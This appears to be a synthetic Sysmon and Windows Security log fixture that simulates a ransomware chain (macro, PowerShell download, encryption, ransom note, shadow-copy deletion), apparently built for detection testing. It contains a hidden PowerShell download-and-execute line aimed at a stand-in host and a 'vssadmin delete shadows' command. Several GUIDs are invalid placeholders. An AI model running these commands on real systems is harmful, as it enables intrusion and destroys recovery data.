<!--
SCENARIO 5: Ransomware Attack Chain
Timeline: Initial access via phishing -> Reconnaissance -> Encryption -> Ransom Note
Threat Level: CRITICAL - Ransomware, Data Destruction
OCSF Mapping: File System Activity, Process Activity, Network Activity
Attribution: TTPs similar to BlackCat/ALPHV ransomware
-->

<!-- EVENT 1: Sysmon Event ID 1 - Malicious Macro Execution (Initial Access) -->
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2025-12-01T08:15:23.456Z" />
    <EventRecordID>412345</EventRecordID>
    <Correlation />
    <Execution ProcessID="4256" ThreadID="5812" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>TREASURY-PC-045.treasury.gov</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1204.002,technique_name=User Execution Malicious File</Data>
    <Data Name="UtcTime">2025-12-01 08:15:23.456</Data>
    <Data Name="ProcessGuid">{A7B8C9D0-1234-5EFG-6789-012345678ABC}</Data>
    <Data Name="ProcessId">6824</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
    <Data Name="Description">Windows PowerShell</Data>
    <Data Name="Product">Microsoft Windows Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">PowerShell.EXE</Data>
    <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-cdn.xyz/stage2.ps1')"</Data>
    <Data Name="CurrentDirectory">C:\Users\robert.smith\AppData\Local\Temp\</Data>
    <Data Name="User">TREASURY\robert.smith</Data>
    <Data Name="LogonGuid">{A7B8C9D0-1234-5EFG-1111-AABBCCDD0000}</Data>
    <Data Name="LogonId">0x6F5E4D</Data>
    <Data Name="TerminalSessionId">2</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">SHA256=C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7</Data>
    <Data Name="ParentProcessGuid">{A7B8C9D0-1234-5EFG-6789-PARENTPARENT1}</Data>
    <Data Name="ParentProcessId">9512</Data>
    <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE</Data>
    <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" /automation -Embedding</Data>
    <Data Name="ParentUser">TREASURY\robert.smith</Data>
  </EventData>
</Event>

<!-- EVENT 2: Sysmon Event ID 3 - Network Connection to Download Ransomware Payload -->
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>3</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>3</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2025-12-01T08:15:24.789Z" />
    <EventRecordID>412346</EventRecordID>
    <Correlation />
    <Execution ProcessID="4256" ThreadID="5812" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>TREASURY-PC-045.treasury.gov</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1105,technique_name=Ingress Tool Transfer</Data>
    <Data Name="UtcTime">2025-12-01 08:15:24.789</Data>
    <Data Name="ProcessGuid">{A7B8C9D0-1234-5EFG-6789-012345678ABC}</Data>
    <Data Name="ProcessId">6824</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="User">TREASURY\robert.smith</Data>
    <Data Name="Protocol">tcp</Data>
    <Data Name="Initiated">true</Data>
    <Data Name="SourceIsIpv6">false</Data>
    <Data Name="SourceIp">10.78.90.45</Data>
    <Data Name="SourceHostname">TREASURY-PC-045.treasury.gov</Data>
    <Data Name="SourcePort">53921</Data>
    <Data Name="SourcePortName">-</Data>
    <Data Name="DestinationIsIpv6">false</Data>
    <Data Name="DestinationIp">203.0.113.89</Data>
    <Data Name="DestinationHostname">malicious-cdn.xyz</Data>
    <Data Name="DestinationPort">80</Data>
    <Data Name="DestinationPortName">http</Data>
  </EventData>
</Event>

<!-- EVENT 3: Sysmon Event ID 11 - Ransomware Binary Written to Disk -->
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>11</EventID>
    <Version>2</Version>
    <Level>4</Level>
    <Task>11</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2025-12-01T08:15:26.123Z" />
    <EventRecordID>412347</EventRecordID>
    <Correlation />
    <Execution ProcessID="4256" ThreadID="5812" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>TREASURY-PC-045.treasury.gov</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1486,technique_name=Data Encrypted for Impact</Data>
    <Data Name="UtcTime">2025-12-01 08:15:26.123</Data>
    <Data Name="ProcessGuid">{A7B8C9D0-1234-5EFG-6789-012345678ABC}</Data>
    <Data Name="ProcessId">6824</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="TargetFilename">C:\ProgramData\Microsoft\Windows\SystemData\encrypt.exe</Data>
    <Data Name="CreationUtcTime">2025-12-01 08:15:26.123</Data>
    <Data Name="User">TREASURY\robert.smith</Data>
  </EventData>
</Event>

<!-- EVENT 4: Sysmon Event ID 1 - Ransomware Execution -->
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2025-12-01T08:15:30.456Z" />
    <EventRecordID>412348</EventRecordID>
    <Correlation />
    <Execution ProcessID="4256" ThreadID="5812" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>TREASURY-PC-045.treasury.gov</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1486,technique_name=Data Encrypted for Impact</Data>
    <Data Name="UtcTime">2025-12-01 08:15:30.456</Data>
    <Data Name="ProcessGuid">{A7B8C9D0-1234-5EFG-6789-RANSOMRANSOMR}</Data>
    <Data Name="ProcessId">7916</Data>
    <Data Name="Image">C:\ProgramData\Microsoft\Windows\SystemData\encrypt.exe</Data>
    <Data Name="FileVersion">6.6.6.6</Data>
    <Data Name="Description">BlackCat Encryptor</Data>
    <Data Name="Product">ALPHV</Data>
    <Data Name="Company">N/A</Data>
    <Data Name="OriginalFileName">encrypt.exe</Data>
    <Data Name="CommandLine">encrypt.exe --access-token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 --no-vm-check --no-net-scan</Data>
    <Data Name="CurrentDirectory">C:\ProgramData\Microsoft\Windows\SystemData\</Data>
    <Data Name="User">TREASURY\robert.smith</Data>
    <Data Name="LogonGuid">{A7B8C9D0-1234-5EFG-1111-AABBCCDD0000}</Data>
    <Data Name="LogonId">0x6F5E4D</Data>
    <Data Name="TerminalSessionId">2</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">SHA256=D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9</Data>
    <Data Name="ParentProcessGuid">{A7B8C9D0-1234-5EFG-6789-012345678ABC}</Data>
    <Data Name="ParentProcessId">6824</Data>
    <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="ParentCommandLine">powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden</Data>
    <Data Name="ParentUser">TREASURY\robert.smith</Data>
  </EventData>
</Event>

<!-- EVENT 5: Sysmon Event ID 11 - Mass File Encryption (Multiple Files) -->
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>11</EventID>
    <Version>2</Version>
    <Level>4</Level>
    <Task>11</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2025-12-01T08:15:45.789Z" />
    <EventRecordID>412349</EventRecordID>
    <Correlation />
    <Execution ProcessID="4256" ThreadID="5812" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>TREASURY-PC-045.treasury.gov</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1486,technique_name=Data Encrypted for Impact</Data>
    <Data Name="UtcTime">2025-12-01 08:15:45.789</Data>
    <Data Name="ProcessGuid">{A7B8C9D0-1234-5EFG-6789-RANSOMRANSOMR}</Data>
    <Data Name="ProcessId">7916</Data>
    <Data Name="Image">C:\ProgramData\Microsoft\Windows\SystemData\encrypt.exe</Data>
    <Data Name="TargetFilename">C:\Users\robert.smith\Documents\Financial_Report_2025.xlsx.blackcat</Data>
    <Data Name="CreationUtcTime">2025-12-01 08:15:45.789</Data>
    <Data Name="User">TREASURY\robert.smith</Data>
  </EventData>
</Event>

<!-- EVENT 6: Sysmon Event ID 23 - File Deletion (Original Files Deleted After Encryption) -->
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>23</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>23</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2025-12-01T08:15:46.123Z" />
    <EventRecordID>412350</EventRecordID>
    <Correlation />
    <Execution ProcessID="4256" ThreadID="5812" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>TREASURY-PC-045.treasury.gov</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1485,technique_name=Data Destruction</Data>
    <Data Name="UtcTime">2025-12-01 08:15:46.123</Data>
    <Data Name="ProcessGuid">{A7B8C9D0-1234-5EFG-6789-RANSOMRANSOMR}</Data>
    <Data Name="ProcessId">7916</Data>
    <Data Name="User">TREASURY\robert.smith</Data>
    <Data Name="Image">C:\ProgramData\Microsoft\Windows\SystemData\encrypt.exe</Data>
    <Data Name="TargetFilename">C:\Users\robert.smith\Documents\Financial_Report_2025.xlsx</Data>
    <Data Name="Hashes">SHA256=E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0</Data>
    <Data Name="IsExecutable">No</Data>
    <Data Name="Archived">Yes</Data>
  </EventData>
</Event>

<!-- EVENT 7: Sysmon Event ID 11 - Ransom Note Creation -->
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>11</EventID>
    <Version>2</Version>
    <Level>4</Level>
    <Task>11</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2025-12-01T08:16:00.456Z" />
    <EventRecordID>412351</EventRecordID>
    <Correlation />
    <Execution ProcessID="4256" ThreadID="5812" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>TREASURY-PC-045.treasury.gov</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1491.001,technique_name=Defacement Internal Defacement</Data>
    <Data Name="UtcTime">2025-12-01 08:16:00.456</Data>
    <Data Name="ProcessGuid">{A7B8C9D0-1234-5EFG-6789-RANSOMRANSOMR}</Data>
    <Data Name="ProcessId">7916</Data>
    <Data Name="Image">C:\ProgramData\Microsoft\Windows\SystemData\encrypt.exe</Data>
    <Data Name="TargetFilename">C:\Users\robert.smith\Desktop\RECOVER-FILES-README.txt</Data>
    <Data Name="CreationUtcTime">2025-12-01 08:16:00.456</Data>
    <Data Name="User">TREASURY\robert.smith</Data>
  </EventData>
</Event>

<!-- EVENT 8: Windows Security Event ID 4688 - Shadow Copy Deletion (Anti-Recovery) -->
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" />
    <EventID>4688</EventID>
    <Version>2</Version>
    <Level>0</Level>
    <Task>13312</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2025-12-01T08:15:55.234Z" />
    <EventRecordID>4567890</EventRecordID>
    <Correlation />
    <Execution ProcessID="4" ThreadID="7856" />
    <Channel>Security</Channel>
    <Computer>TREASURY-PC-045.treasury.gov</Computer>
    <Security />
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-5-21-2345678901-8765432109-3333444455-1105</Data>
    <Data Name="SubjectUserName">robert.smith</Data>
    <Data Name="SubjectDomainName">TREASURY</Data>
    <Data Name="SubjectLogonId">0x6F5E4D</Data>
    <Data Name="NewProcessId">0x2468</Data>
    <Data Name="NewProcessName">C:\Windows\System32\vssadmin.exe</Data>
    <Data Name="TokenElevationType">%%1936</Data>
    <Data Name="ProcessId">0x1EEC</Data>
    <Data Name="CommandLine">vssadmin.exe delete shadows /all /quiet</Data>
    <Data Name="TargetUserSid">S-1-0-0</Data>
    <Data Name="TargetUserName">-</Data>
    <Data Name="TargetDomainName">-</Data>
    <Data Name="TargetLogonId">0x0</Data>
    <Data Name="ParentProcessName">C:\ProgramData\Microsoft\Windows\SystemData\encrypt.exe</Data>
    <Data Name="MandatoryLabel">S-1-16-8192</Data>
  </EventData>
</Event>
